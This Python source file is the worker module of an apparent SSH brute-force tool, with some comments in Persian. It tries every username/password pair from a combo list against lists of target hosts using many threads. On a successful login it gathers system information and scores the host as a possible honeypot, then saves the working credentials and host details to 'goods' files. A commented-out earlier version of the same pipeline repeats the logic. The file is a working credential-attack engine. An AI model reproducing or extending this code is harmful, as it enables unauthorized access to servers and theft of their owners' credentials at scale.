# -*- UTF-8 -*-
# core/worker.py

import time
import queue
import threading
import concurrent.futures
import signal
from typing import Iterable, List, Tuple, Union
from pathlib import Path

from ui.banner import BannerStat
from ui.decorators import MsgDCR
from ui.table import Table
from core.config import (
    BRUTE_FORCE_STOP_EVENT,
    STATS, 
    globalConfig,
    DEFAULT_PATH
)
from core.recon import Recon
from core.honeypot import HoneypotEngine
from core.ssh_client import SSH_CONNECT
from core.models import ServerInfo, HoneypotDetector, SSHTask
from utils.io_utils import IO
from cli.signals import handle_SIGINT

class WorkerPipeline:
    def __init__(self, total_tasks: int,
                 timeout: int = globalConfig.TIMEOUT_SECS, 
                 max_workers: int = globalConfig.MAX_WORKERS,
                 per_worker: int = globalConfig.CONCURRENT_PER_WORKER,
                 log_file: str = DEFAULT_PATH.DEBUG_FILE,
                 success_file: str = DEFAULT_PATH.GOODS_FILE,
                 success_detailed_file: str = DEFAULT_PATH.GOODS_DETAILED_FILE_PATH,
                 honeypot_file: str = DEFAULT_PATH.HONEYPOTS_FILE
                 ):
        self.total_tasks = total_tasks
        self.timeout = timeout
        self.max_workers = max_workers
        self.per_worker = per_worker
        self.log_file = log_file
        self.success_file = success_file
        self.success_detailed_file = success_detailed_file
        self.honeypot_file = honeypot_file
        self.io = IO()
        self.recon = Recon()
        self.honeypot_detector = HoneypotDetector()
        self.honeypot_engine = HoneypotEngine()
        self.task_q: "queue.Queue[SSHTask]" = queue.Queue(
            max(1, self.calculate_optimal_buffer()))
        
        self._stats_lock = threading.Lock()
        self._success_map_lock = threading.Lock()
        self._successful_ip_port = set()

    def _process_wrapper(self, task: SSHTask, semaphore: threading.Semaphore) -> None:
        try:
            self.process_task(task)
        finally:
            semaphore.release()
    def run(self, combos: List[Tuple[str, str]], targets: List[Tuple[str, str]]) -> None:
        if not self.total_tasks:
            try:
                self.total_tasks = len(combos) * len(targets)
            except Exception:
                self.total_tasks = 0

        if self.total_tasks == 0:
            MsgDCR.FailureMessage("No tasks to run. Check your files.")
            return

        globalConfig.START_TIME_MONOTONIC = time.perf_counter()

        # Live stats/banner thread
        banner_tasks = BannerStat(self.total_tasks)

        banner = threading.Thread(
            target=banner_tasks.run, daemon=True)
        banner.start()

        # Producer fills queue with SSHTask instances
        def producer() -> None:
            try:
                for task in self.generate_tasks(combos, targets, timeout = self.timeout):
                    if BRUTE_FORCE_STOP_EVENT.is_set():
                        break
                    self.task_q.put(task)
            finally:
                # Send sentinel Nones to let workers finish
                for _ in range(self.max_workers):
                    self.task_q.put(None)  # type: ignore[arg-type]

        prod_t = threading.Thread(target=producer, daemon=True)
        prod_t.start()

        # Launch outer workers and wait for completion
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            worker_futures = [pool.submit(self.worker_main, _)
                              for _ in range(self.max_workers)]
            prod_t.join()
            concurrent.futures.wait(worker_futures, timeout=None)

        # Signal banner to stop and give it a moment to exit
        BRUTE_FORCE_STOP_EVENT.set()
        banner.join(timeout=1)

    # def worker_main(self, worker_id: int) -> None:
    #     semaphore = threading.BoundedSemaphore(
    #         self.per_worker)
    #     futures: List[concurrent.futures.Future[None]] = []
    #     with concurrent.futures.ThreadPoolExecutor(max_workers=self.per_worker) as inner_pool:
    #         while True:
    #             if BRUTE_FORCE_STOP_EVENT.is_set():
    #                 break
    #             try:
    #                 task = self.task_q.get(timeout=0.2)
    #             except queue.Empty:
    #                 continue
    #             if task is None:
    #                 break
    #             semaphore.acquire()
    #             fut = inner_pool.submit(
    #                 self._process_wrapper, task, semaphore)
    #             futures.append(fut)
    #     # Ensure all inner futures complete
    #     concurrent.futures.wait(futures, timeout=None)
    def worker_main(self, worker_id: int) -> None:
        semaphore = threading.BoundedSemaphore(self.per_worker)
        futures: List[concurrent.futures.Future[None]] = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.per_worker) as inner_pool:
            while True:
                if BRUTE_FORCE_STOP_EVENT.is_set():
                    break

                try:
                    task = self.task_q.get(timeout=0.2)
                except queue.Empty:
                    continue

                if task is None:
                    break

                semaphore.acquire()
                fut = inner_pool.submit(self._process_wrapper, task, semaphore)
                futures.append(fut)

            # تلاش برای توقف graceful
            done, not_done = concurrent.futures.wait(futures, timeout=10)
            for fut in not_done:
                fut.cancel()  # یا log کنید

    def calculate_optimal_buffer(self) -> int:
        # Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (safety factor)
        return int(self.max_workers * self.per_worker * 1.5)


    def generate_tasks(self, combos: Iterable[Tuple[str, str]], targets: Iterable[Tuple[str, str]], timeout: int = 5) -> Iterable[SSHTask]:
        for u, p in combos:
            for ip, port in targets:
                yield SSHTask(ip=ip, port=port, username=u, password=p, timeout=timeout)
    
    def process_task(self, task: SSHTask) -> None:
        """Process a single SSH task with safe logging and stats updates."""

        t0 = time.perf_counter()

        try:
            with SSH_CONNECT(
                username=task.username, 
                password=task.password, 
                timeout=task.timeout
                ) as ssh:
                try:
                    ssh.connect(task.ip, task.port)
                except Exception as ex:
                    with self._stats_lock:
                        STATS.ERRORS += 1
                    self.io.file_append(self.log_file, f'[ ERROR ] {task.ip}:{task.port}@{task.username}:{task.password}: {ex}\n')
                    return
                
                server = ServerInfo(
                    ip=task.ip,
                    port=task.port,
                    username=task.username,
                    password=task.password,
                )

                server.response_time_ms = (time.perf_counter() - t0) * 1000.0

                self.recon.gather_system_info(ssh, server)
                server.is_honeypot = self.honeypot_engine.detect(ssh, server, self.honeypot_detector)

                key = f"{task.ip}:{task.port}"
                with self._success_map_lock:
                    if key in self._successful_ip_port:
                        return
                    self._successful_ip_port.add(key)
                
                if not server.is_honeypot:
                    with self._stats_lock:
                        STATS.GOODS += 1
                    self.io.file_append(
                        self.log_file,
                        f"[SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n",
                    )
                    self.log_success(server)
                else:
                    with self._stats_lock:
                        STATS.HONEYPOTS += 1
                    self.io.file_append(
                        self.log_file,
                        f"[HONEYPOT SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n",
                    )
                    self.io.file_append(
                        DEFAULT_PATH.HONEYPOTS_FILE,
                        f"HONEYPOT: {server.ip}:{server.port}@{server.username}:{server.password} (Score: {server.honeypot_score})\n",
                    )
        except RuntimeError:
            with self._stats_lock:
                STATS.ERRORS += 1
            self.io.file_append(
                self.log_file,
                f"[RUNTIME ERROR] {task.ip}:{task.port}@{task.username}:{task.password}\n",
            )

    def log_success(self, server: ServerInfo) -> None:
        simple = f"{server.ip}:{server.port}@{server.username}:{server.password}"
        self.io.file_append(self.success_file, simple + "\n")
        detailed_table = Table(block_padding=4)
        detailed_table.add_block(['SSH SUCCESS'])
        detailed_table.add_block([
            f'Target: {server.ip}:{server.port}',
            f'Credentials: {server.username}:{server.password}',
            f'Hostname: {server.hostname}',
            f'OS: {server.os_info}',
            f'SSH Version: {server.ssh_version}',
            f'Response Time: {server.response_time_ms:.2f} ms',
            f'Open Ports: {server.open_ports}',
            f'Honeypot Score: {server.honeypot_score}',
            f'Timestamp: {(time.strftime("%Y-%m-%d %H:%M:%S"))}'
        ])
        self.io.file_append(self.success_detailed_file,
                    detailed_table.display_plain() + '\n')


# import time
# import queue
# import threading
# import concurrent.futures
# import traceback
# from typing import Iterable, List, Tuple, Optional

# from ui.banner import BannerStat
# from ui.decorators import MsgDCR
# from ui.table import Table
# from core.config import (
#     BRUTE_FORCE_STOP_EVENT,
#     STATS, 
#     globalConfig,
#     DEFAULT_PATH
# )
# from core.recon import Recon
# from core.honeypot import HoneypotEngine
# from core.ssh_client import SSH_CONNECT
# from core.models import ServerInfo, HoneypotDetector, SSHTask
# from utils.io_utils import IO

# class WorkerPipeline:
#     def __init__(self, total_tasks: int = 0,
#                  timeout: int = globalConfig.TIMEOUT_SECS,
#                  max_workers: int = globalConfig.MAX_WORKERS,
#                  log_file: str = DEFAULT_PATH.DEBUG_FILE,
#                  success_file: str = DEFAULT_PATH.GOODS_FILE,
#                  success_detailed_file: str = DEFAULT_PATH.GOODS_DETAILED_FILE_PATH,
#                  honeypot_file: str = DEFAULT_PATH.HONEYPOTS_FILE
#                  ):
#         self.total_tasks = total_tasks
#         self.timeout = timeout
#         self.max_workers = max_workers
#         self.log_file = log_file
#         self.success_file = success_file
#         self.success_detailed_file = success_detailed_file
#         self.honeypot_file = honeypot_file

#         self.io = IO()
#         self.recon = Recon()
#         self.honeypot_engine = HoneypotEngine()

#         # صف بدون محدودیت سایز، کنترل توقف از طریق رویدادها
#         self.task_q: queue.Queue[Optional[SSHTask]] = queue.Queue()

#         self.lock_stats = threading.Lock()
#         self.lock_success_map = threading.Lock()

#     def run(self, combos: List[Tuple[str, str]], targets: List[Tuple[str, str]]) -> None:
#         # محاسبه تعداد کل تسک‌ها
#         if not self.total_tasks:
#             try:
#                 self.total_tasks = len(combos) * len(targets)
#             except Exception:
#                 self.total_tasks = 0

#         if self.total_tasks == 0:
#             MsgDCR.FailureMessage("No tasks to run. Check your files.")
#             return

#         globalConfig.START_TIME_MONOTONIC = time.perf_counter()

#         # استارت بنر نمایشگر استاتوس زنده
#         banner_tasks = BannerStat(self.total_tasks)
#         banner_thread = threading.Thread(target=banner_tasks.run, daemon=True)
#         banner_thread.start()

#         # تولید تسک‌ها
#         for task in self.generate_tasks(combos, targets):
#             if BRUTE_FORCE_STOP_EVENT.is_set():
#                 break
#             self.task_q.put(task)

#         # قرار دادن sentinel برای پایان کار
#         for _ in range(self.max_workers):
#             self.task_q.put(None)

#         # اجرای worker ها با ThreadPoolExecutor
#         with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
#             futures = [executor.submit(self.worker_main) for _ in range(self.max_workers)]

#             # صبر تا پایان همه futures
#             concurrent.futures.wait(futures)

#         # توقف بنر و انتظار برای پایان آن
#         BRUTE_FORCE_STOP_EVENT.set()
#         banner_thread.join(timeout=1)

#     def worker_main(self) -> None:
#         while not BRUTE_FORCE_STOP_EVENT.is_set():
#             try:
#                 task = self.task_q.get(timeout=0.5)
#             except queue.Empty:
#                 continue

#             if task is None:
#                 # sentinel دریافت شد - خروج از حلقه
#                 break

#             try:
#                 self.process_task(task)
#             except Exception as e:
#                 # ثبت کامل traceback جهت خطاهای غیرمنتظره
#                 with self.lock_stats:
#                     STATS.ERRORS += 1
#                 error_msg = f"Exception processing task {task.ip}:{task.port}@{task.username}: {e}\n{traceback.format_exc()}"
#                 self.io.file_append(self.log_file, error_msg)

#     def generate_tasks(self, combos: Iterable[Tuple[str, str]], targets: Iterable[Tuple[str, str]]) -> Iterable[SSHTask]:
#         for username, password in combos:
#             for ip, port in targets:
#                 yield SSHTask(ip=ip, port=port, username=username, password=password)

#     def process_task(self, task: SSHTask) -> None:
#         self.io.file_append(
#             self.log_file,
#             f"[TRYING] {task.ip}:{task.port}@{task.username}:{task.password}\n",
#         )

#         start_time = time.perf_counter()
#         try:
#             ssh = SSH_CONNECT(
#                 hostname=task.ip,
#                 port=int(task.port),
#                 username=task.username,
#                 password=task.password,
#                 timeout=self.timeout
#             )
#             connected = ssh.connect()

#             if not connected:
#                 with self.lock_stats:
#                     STATS.ERRORS += 1
#                 return

#             server = ServerInfo(
#                 ip=task.ip,
#                 port=task.port,
#                 username=task.username,
#                 password=task.password,
#             )
#             server.response_time_ms = (time.perf_counter() - start_time) * 1000.0

#             self.recon.gather_system_info(ssh, server)
#             detector = HoneypotDetector()
#             server.is_honeypot = self.honeypot_engine.detect(ssh, server, detector)

#             key = f"{server.ip}:{server.port}"
#             with self.lock_success_map:
#                 if key in STATS.SUCCESSFUL_IP_PORT:
#                     return
#                 STATS.SUCCESSFUL_IP_PORT.add(key)

#             if server.is_honeypot:
#                 with self.lock_stats:
#                     STATS.HONEYPOTS += 1
#                 self.io.file_append(
#                     self.log_file,
#                     f"[HONEYPOT SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n",
#                 )
#                 self.io.file_append(
#                     self.honeypot_file,
#                     f"HONEYPOT: {server.ip}:{server.port}@{server.username}:{server.password} (Score: {server.honeypot_score})\n",
#                 )
#             else:
#                 with self.lock_stats:
#                     STATS.GOODS += 1
#                 self.io.file_append(
#                     self.log_file,
#                     f"[SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n",
#                 )
#                 self.log_success(server)

#         except RuntimeError as e:
#             with self.lock_stats:
#                 STATS.ERRORS += 1
#             self.io.file_append(
#                 self.log_file,
#                 f"[RUNTIME ERROR] {task.ip}:{task.port}@{task.username}:{task.password} - {e}\n",
#             )
#         except Exception as ex:
#             with self.lock_stats:
#                 STATS.ERRORS += 1
#             self.io.file_append(
#                 self.log_file,
#                 f"[NOT CONNECTED] {task.ip}:{task.port}@{task.username}:{task.password} with error: {ex}\n",
#             )

#     def log_success(self, server: ServerInfo) -> None:
#         simple_entry = f"{server.ip}:{server.port}@{server.username}:{server.password}"
#         self.io.file_append(self.success_file, simple_entry + "\n")

#         detailed_table = Table(block_padding=4)
#         detailed_table.add_block(['SSH SUCCESS'])
#         detailed_table.add_block([
#             f'Target: {server.ip}:{server.port}',
#             f'Credentials: {server.username}:{server.password}',
#             f'Hostname: {server.hostname}',
#             f'OS: {server.os_info}',
#             f'SSH Version: {server.ssh_version}',
#             f'Response Time: {server.response_time_ms:.2f} ms',
#             f'Open Ports: {server.open_ports}',
#             f'Honeypot Score: {server.honeypot_score}',
#             f'Timestamp: {time.strftime("%Y-%m-%d %H:%M:%S")}'
#         ])
#         self.io.file_append(self.success_detailed_file, detailed_table.display_plain() + '\n')
